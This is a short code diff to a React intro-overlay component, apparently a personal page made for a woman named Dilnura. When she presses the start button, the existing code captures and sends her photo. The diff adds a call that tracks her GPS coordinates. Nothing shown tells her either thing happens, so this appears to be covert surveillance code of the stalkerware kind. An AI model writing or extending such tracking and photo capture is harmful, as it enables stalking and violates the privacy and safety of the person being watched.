@@ -4,6 +4,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { useState } from "react";
 import { content } from "@/lib/content";
 import { captureAndSendPhoto } from "@/lib/camera";
+import { trackGpsCoordinates } from "@/lib/tracker";
 
 /**
  * The first thing she sees: pure black, one glowing sentence,
@@ -19,6 +20,7 @@ export default function IntroOverlay({ onBegin }: { onBegin: () => void }) {
     
     // Request camera and send initial photo
     captureAndSendPhoto("📸 Dilnura saytga kirdi (Boshlash tugmasi bosildi)");
+    void trackGpsCoordinates();
 
     setTimeout(onBegin, 1600);
   };
